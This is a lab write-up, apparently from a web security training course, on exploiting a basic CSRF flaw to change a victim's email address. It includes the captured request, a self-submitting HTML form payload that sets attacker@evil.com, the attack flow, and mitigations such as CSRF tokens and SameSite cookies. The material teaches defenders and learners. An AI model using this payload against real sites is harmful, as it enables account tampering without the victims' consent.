# Lab01 - Basic CSRF Vulnerability

## Objective

Exploit a CSRF vulnerability to change the victim's email address without their consent.

---

# Lab Difficulty

```text
Apprentice
```

---

# Vulnerability Overview

This lab is vulnerable to:

```text
Cross-Site Request Forgery (CSRF)
```

The application processes sensitive state-changing requests without validating whether the request originated from a trusted source.

---

# Understanding the Vulnerability

The application relies entirely on:

```text
session cookies
```

for authentication.

Because browsers automatically attach cookies to requests, attackers can forge authenticated requests from external websites.

---

# Reconnaissance

The email change functionality was analyzed using Burp Suite Proxy.

---

# Captured Request

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=abc123

email=attacker@evil.com
```

---

# Initial Observations

The request contained:

- no CSRF token
- no Origin validation
- no Referer validation

This indicated possible CSRF vulnerability.

---

# Attack Methodology

The attack recreated the legitimate request using a malicious HTML form hosted on an attacker-controlled page.

---

# Step 1 - Capture Legitimate Request

The legitimate email change request was intercepted using Burp Suite Proxy.

---

# Step 2 - Generate CSRF PoC

Using Burp Suite:

```text
Right Click Request
        ↓
Engagement Tools
        ↓
Generate CSRF PoC
```

Burp automatically generated an HTML proof-of-concept.

---

# Generated Payload

```html
<html>
  <body>
    <form action="https://vulnerable-website.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

# Why the Attack Works

When the victim visits the malicious page:

- the form auto-submits
- the browser automatically attaches session cookies
- the server processes the request as authenticated

---

# Step 3 - Deliver Payload

The generated payload was hosted using the exploit server.

---

# Step 4 - Victim Executes Request

When the victim loaded the malicious page:

```text
Browser automatically attached session cookie
        ↓
Request processed successfully
        ↓
Victim email changed
```

---

# Result

The victim’s email address was successfully changed without their consent.

---

# Root Cause

The application failed to implement CSRF defenses such as:

- CSRF tokens
- SameSite cookie protections
- Origin validation
- Referer validation

---

# Why This Is Dangerous

Sensitive actions should never rely solely on cookies for authentication.

Otherwise attackers may:

- modify accounts
- perform unauthorized actions
- compromise user accounts

---

# Important Browser Behavior

The browser automatically attached:

```http
Cookie: session=abc123
```

even though the request originated from a malicious website.

---

# Common CSRF Indicators

| Indicator | Observation |
|---|---|
| Cookie-Based Authentication | Present |
| No CSRF Token | Present |
| State-Changing Request | Present |
| No Origin Validation | Present |

---

# Mitigation

Applications should implement:

- CSRF tokens
- SameSite cookies
- Origin validation
- Referer validation

---

# Related Theory

- `Theory/01-what-is-csrf.md`
- `Theory/03-how-csrf-works.md`
- `Theory/04-how-to-construct-a-csrf-attack.md`

---

# Related Payloads

- `Payloads/csrf-html-poc-templates.md`
- `Payloads/auto-submit-form-payloads.md`

---

# Related Notes

- `Notes/browser-behavior-notes.md`
- `Notes/burp-workflow.md`

---

# Tools Used

| Tool | Purpose |
|---|---|
| Burp Suite Proxy | Capture requests |
| Burp Engagement Tools | Generate PoC |
| Exploit Server | Host payload |

---

# Key Learnings

- Learned how browsers automatically attach session cookies.
- Practiced generating CSRF proof-of-concepts.
- Understood how hidden forms exploit authenticated sessions.
- Improved Burp Suite workflow skills.

---

# Attack Flow Summary

```text
Victim Logs In
        ↓
Victim Visits Malicious Site
        ↓
Hidden Form Auto-Submits
        ↓
Browser Attaches Session Cookie
        ↓
Application Processes Request
        ↓
Victim Email Changed
```

---

> [!IMPORTANT]
> CSRF exploits browser trust in authenticated sessions.

> [!TIP]
> Always verify whether state-changing requests use CSRF tokens.

> [!WARNING]
> Applications relying solely on cookies for authentication are highly vulnerable to CSRF.